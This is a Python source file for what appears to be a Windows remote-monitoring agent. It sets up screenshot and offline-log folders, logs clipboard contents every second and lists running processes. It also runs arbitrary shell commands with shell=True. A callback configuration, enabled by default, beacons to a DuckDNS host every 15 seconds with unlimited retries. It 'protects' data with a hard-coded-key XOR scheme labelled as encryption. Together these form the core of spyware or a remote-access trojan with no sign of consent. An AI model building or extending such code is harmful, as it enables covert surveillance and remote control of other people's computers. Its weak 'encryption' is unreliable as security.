"""
Unified Server Core Module
Combines configuration, utilities, clipboard, and basic encryption functionality
"""
import json
import os
import secrets
import socket
import subprocess
import threading
import time
import hashlib
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any
import base64

# Try to use unified config first, fallback to legacy
try:
    from unified_config import unified_config, load_config, load_callback_config
    UNIFIED_MODE = True
    CONFIG_FILE = "app_config.json"
except ImportError:
    UNIFIED_MODE = False
    CONFIG_FILE = "config.json"

# Windows-specific imports
try:
    import win32clipboard
    import win32con
    CLIPBOARD_AVAILABLE = True
except ImportError:
    CLIPBOARD_AVAILABLE = False
    print("Warning: win32clipboard not available. Install pywin32.")

# Directories
DATA_DIR = Path("monitor_data")
SCREENSHOTS_DIR = DATA_DIR / "screenshots"
OFFLINE_LOGS_DIR = DATA_DIR / "offline_logs"


class ConfigManager:
    """Unified configuration management for server"""
    
    @staticmethod
    def ensure_directories():
        """Create necessary directories"""
        DATA_DIR.mkdir(exist_ok=True)
        SCREENSHOTS_DIR.mkdir(exist_ok=True)
        OFFLINE_LOGS_DIR.mkdir(exist_ok=True)
    
    @staticmethod
    def load_config():
        """Load configuration from file"""
        if UNIFIED_MODE:
            config = unified_config.get_server_config()
            if config:
                return config
        
        # Fallback to legacy mode
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        
        # Generate default config
        config = {
            "api_key": secrets.token_urlsafe(32),
            "port": 5000,
            "host": "0.0.0.0",
            "auto_screenshot": False,
            "screenshot_interval": 300,
            "motion_detection": False,
            "data_retention_days": 30,
            "pc_id": secrets.token_hex(8),
            "pc_name": os.environ.get('COMPUTERNAME', 'Unknown-PC')
        }
        
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        
        print(f"\n{'='*70}")
        print("FIRST TIME SETUP - Configuration Created")
        print(f"{'='*70}")
        print(f"API Key: {config['api_key']}")
        print(f"Port: {config['port']}")
        print(f"\nSave this API key - you'll need it in the client!")
        print(f"{'='*70}\n")
        
        return config
    
    @staticmethod
    def load_callback_config():
        """Load callback configuration with enhanced integration"""
        if UNIFIED_MODE:
            # Use unified config system
            callback_config = unified_config.get_callback_config()
            if callback_config:
                return callback_config
        
        # Fallback to legacy mode
        callback_file = Path("callback_config.json")
        
        if callback_file.exists():
            try:
                with open(callback_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        
        # Enhanced default config with DuckDNS
        default_config = {
            "enabled": True,  # Enable by default for enhanced system
            "callback_url": "http://monitor-client.duckdns.org:8080",  # Use DuckDNS
            "callback_key": "COPY_FROM_CLIENT",
            "interval": 15,
            "heartbeat_interval": 5,
            "retry_interval": 10,
            "max_retries": -1
        }
        
        with open(callback_file, 'w') as f:
            json.dump(default_config, f, indent=4)
        
        return default_config


class NetworkUtils:
    """Network utility functions"""
    
    @staticmethod
    def get_local_ip():
        """Get the local IPv4 address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            pass
        
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            if local_ip.startswith('127.'):
                raise Exception("Got loopback")
            return local_ip
        except:
            pass
        
        return "0.0.0.0"
    
    @staticmethod
    def get_all_local_ips():
        """Get all local IP addresses"""
        ips = []
        try:
            result = subprocess.run(['ipconfig'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            
            for line in lines:
                if 'IPv4 Address' in line or 'IPv4' in line:
                    if ':' in line:
                        ip = line.split(':')[-1].strip()
                        ip = ip.replace('(Preferred)', '').strip()
                        if not ip.startswith('127.') and not ip.startswith('169.254.'):
                            if ip not in ips:
                                ips.append(ip)
        except:
            pass
        return ips
    
    @staticmethod
    def test_port_open(host: str, port: int, timeout: int = 3) -> bool:
        """Test if a port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False


class ClipboardManager:
    """Unified clipboard management"""
    
    def __init__(self):
        self.clipboard_history = []
        self.clipboard_lock = threading.Lock()
        self.last_clipboard_content = None
        self.monitoring_clipboard = False
        self.clipboard_monitor_thread = None
    
    def get_clipboard_text(self):
        """Safely get clipboard text content"""
        if not CLIPBOARD_AVAILABLE:
            return None
        
        try:
            win32clipboard.OpenClipboard()
            try:
                # Try different formats
                if win32clipboard.IsClipboardFormatAvailable(win32con.CF_UNICODETEXT):
                    data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
                elif win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
                    data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
                    if isinstance(data, bytes):
                        data = data.decode('utf-8', errors='ignore')
                else:
                    data = None
                return data
            finally:
                win32clipboard.CloseClipboard()
        except Exception as e:
            print(f"Error reading clipboard: {e}")
            return None
    
    def set_clipboard_text(self, text):
        """Safely set clipboard text content"""
        if not CLIPBOARD_AVAILABLE:
            return False
        
        try:
            win32clipboard.OpenClipboard()
            try:
                win32clipboard.EmptyClipboard()
                win32clipboard.SetClipboardData(win32con.CF_UNICODETEXT, text)
                return True
            finally:
                win32clipboard.CloseClipboard()
        except Exception as e:
            print(f"Error setting clipboard: {e}")
            return False
    
    def log_clipboard_change(self, content, operation="changed"):
        """Log clipboard change to history"""
        if content != self.last_clipboard_content:
            self.last_clipboard_content = content
            
            with self.clipboard_lock:
                self.clipboard_history.append({
                    "timestamp": datetime.now().isoformat(),
                    "operation": operation,
                    "content": content[:500] if content else "",  # Limit size
                    "length": len(content) if content else 0
                })
                
                # Keep last 50 entries
                if len(self.clipboard_history) > 50:
                    self.clipboard_history.pop(0)
    
    def clipboard_monitor_loop(self):
        """Background thread that monitors clipboard changes"""
        print("[*] Clipboard monitoring started")
        
        while self.monitoring_clipboard:
            try:
                current_content = self.get_clipboard_text()
                
                if current_content and current_content != self.last_clipboard_content:
                    self.log_clipboard_change(current_content, "detected")
                    
            except Exception as e:
                print(f"Clipboard monitor error: {e}")
            
            time.sleep(1)  # Check every second
        
        print("[*] Clipboard monitoring stopped")
    
    def start_monitoring(self):
        """Start monitoring clipboard changes"""
        if not CLIPBOARD_AVAILABLE:
            print("[-] Clipboard monitoring unavailable (pywin32 not installed)")
            return False
        
        if self.monitoring_clipboard:
            return True
        
        self.monitoring_clipboard = True
        self.clipboard_monitor_thread = threading.Thread(
            target=self.clipboard_monitor_loop, 
            daemon=True
        )
        self.clipboard_monitor_thread.start()
        
        return True
    
    def stop_monitoring(self):
        """Stop monitoring clipboard changes"""
        self.monitoring_clipboard = False
    
    def get_history(self):
        """Get clipboard change history"""
        with self.clipboard_lock:
            return self.clipboard_history.copy()
    
    def clear_history(self):
        """Clear clipboard history"""
        with self.clipboard_lock:
            self.clipboard_history.clear()


class SimpleEncryption:
    """Simple encryption utilities for basic security"""
    
    @staticmethod
    def generate_key():
        """Generate a simple encryption key"""
        return secrets.token_urlsafe(32)
    
    @staticmethod
    def simple_encrypt(data: str, key: str = None) -> str:
        """Simple encryption using base64 and XOR"""
        if key is None:
            key = "default_key_12345"
        
        try:
            # Convert to bytes
            data_bytes = data.encode('utf-8')
            key_bytes = key.encode('utf-8')
            
            # XOR encryption
            encrypted_bytes = bytearray()
            for i, byte in enumerate(data_bytes):
                key_byte = key_bytes[i % len(key_bytes)]
                encrypted_bytes.append(byte ^ key_byte)
            
            # Base64 encode
            encrypted_b64 = base64.b64encode(encrypted_bytes).decode('utf-8')
            
            return encrypted_b64
        except Exception as e:
            print(f"Encryption error: {e}")
            return data
    
    @staticmethod
    def simple_decrypt(encrypted_data: str, key: str = None) -> str:
        """Simple decryption"""
        if key is None:
            key = "default_key_12345"
        
        try:
            # Base64 decode
            encrypted_bytes = base64.b64decode(encrypted_data.encode('utf-8'))
            key_bytes = key.encode('utf-8')
            
            # XOR decryption
            decrypted_bytes = bytearray()
            for i, byte in enumerate(encrypted_bytes):
                key_byte = key_bytes[i % len(key_bytes)]
                decrypted_bytes.append(byte ^ key_byte)
            
            # Convert back to string
            decrypted_data = decrypted_bytes.decode('utf-8')
            
            return decrypted_data
        except Exception as e:
            print(f"Decryption error: {e}")
            return encrypted_data
    
    @staticmethod
    def hash_data(data: str) -> str:
        """Create SHA256 hash of data"""
        return hashlib.sha256(data.encode('utf-8')).hexdigest()
    
    @staticmethod
    def verify_hash(data: str, expected_hash: str) -> bool:
        """Verify data against hash"""
        return SimpleEncryption.hash_data(data) == expected_hash


class SystemUtils:
    """System utility functions"""
    
    @staticmethod
    def get_system_info():
        """Get basic system information"""
        import platform
        import psutil
        
        try:
            return {
                "hostname": platform.node(),
                "platform": platform.platform(),
                "processor": platform.processor(),
                "architecture": platform.architecture(),
                "python_version": platform.python_version(),
                "cpu_count": psutil.cpu_count(),
                "memory_total": psutil.virtual_memory().total,
                "disk_usage": {
                    "total": psutil.disk_usage('/').total if os.name != 'nt' else psutil.disk_usage('C:').total,
                    "used": psutil.disk_usage('/').used if os.name != 'nt' else psutil.disk_usage('C:').used,
                    "free": psutil.disk_usage('/').free if os.name != 'nt' else psutil.disk_usage('C:').free
                },
                "boot_time": psutil.boot_time(),
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            return {"error": str(e), "timestamp": datetime.now().isoformat()}
    
    @staticmethod
    def get_running_processes():
        """Get list of running processes"""
        import psutil
        
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            return processes
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def execute_command(command: str, timeout: int = 30):
        """Execute system command safely"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            return {
                "success": True,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "return_code": result.returncode,
                "command": command,
                "timestamp": datetime.now().isoformat()
            }
        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Command timed out",
                "command": command,
                "timeout": timeout,
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "command": command,
                "timestamp": datetime.now().isoformat()
            }


# Initialize directories and load configuration
ConfigManager.ensure_directories()
config = ConfigManager.load_config()
pc_id = config['pc_id']
API_KEY = config['api_key']

# Global instances
clipboard_manager = ClipboardManager()
network_utils = NetworkUtils()
encryption = SimpleEncryption()
system_utils = SystemUtils()

# Legacy function compatibility
def get_local_ip():
    """Legacy interface for getting local IP"""
    return network_utils.get_local_ip()

def get_all_local_ips():
    """Legacy interface for getting all local IPs"""
    return network_utils.get_all_local_ips()

def load_config():
    """Legacy interface for loading config"""
    return ConfigManager.load_config()

def load_callback_config():
    """Legacy interface for loading callback config"""
    return ConfigManager.load_callback_config()

def ensure_directories():
    """Legacy interface for directory creation"""
    return ConfigManager.ensure_directories()

def get_clipboard_text():
    """Legacy interface for clipboard reading"""
    return clipboard_manager.get_clipboard_text()

def set_clipboard_text(text):
    """Legacy interface for clipboard writing"""
    return clipboard_manager.set_clipboard_text(text)

def start_clipboard_monitoring():
    """Legacy interface for clipboard monitoring"""
    return clipboard_manager.start_monitoring()

def stop_clipboard_monitoring():
    """Legacy interface for stopping clipboard monitoring"""
    return clipboard_manager.stop_monitoring()

def get_clipboard_history():
    """Legacy interface for clipboard history"""
    return clipboard_manager.get_history()

def clear_clipboard_history():
    """Legacy interface for clearing clipboard history"""
    return clipboard_manager.clear_history()